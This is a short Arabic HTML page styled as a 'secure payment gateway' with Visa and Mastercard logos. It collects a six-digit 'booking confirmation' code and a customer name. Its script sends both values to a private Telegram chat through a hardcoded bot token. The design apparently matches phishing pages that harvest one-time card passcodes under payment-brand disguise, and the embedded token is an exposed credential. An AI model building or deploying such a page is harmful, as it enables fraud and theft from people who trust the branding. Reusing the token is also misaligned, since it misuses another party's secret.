<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة الدفع الآمنة</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    header, footer {
      background-color: #004080;
      color: white;
      text-align: center;
      padding: 20px 0;
    }
    main {
      padding: 20px;
    }
    form {
      background-color: white;
      padding: 20px;
      border-radius: 8px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      padding: 10px;
      width: 100%;
      background-color: #004080;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
    }
    .card-logos {
      display: flex;
      justify-content: center;
      gap: 20px;
    }
    .card-logos img {
      height: 50px;
    }
  </style>
</head>
<body>

<header>
  <div class="card-logos">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
  </div>
</header>

<main>
  <form id="paymentForm">
    <label for="confirmBooking">تأكيد رقم الحجز (6 أرقام):</label>
    <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" />

    <label for="customerName">اسم العميل:</label>
    <input type="text" id="customerName" required />

    <button type="submit">إرسال إشعار الحجز</button>
  </form>
</main>

<footer>
  جميع الحقوق محفوظة © 2025
</footer>

<script>
document.getElementById("paymentForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const bookingNumber = document.getElementById("confirmBooking").value;
  const customerName = document.getElementById("customerName").value;

  if (bookingNumber.length !== 6) {
    alert("❗ رقم الحجز يجب أن يتكون من 6 أرقام فقط.");
    return;
  }

  // إرسال رقم الحجز واسم العميل فقط إلى البوت
  fetch("https://api.telegram.org/bot7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "1642216679",
      text: `🔔 حجز جديد:\nرقم الحجز: ${bookingNumber}\nاسم العميل: ${customerName}`
    })
  })
  .then(() => {
    alert("تم إرسال إشعار الحجز بنجاح!");
    document.getElementById("paymentForm").reset();
  })
  .catch(() => {
    alert("❌ فشل الإرسال إلى البوت");
  });
});
</script>

</body>
</html>
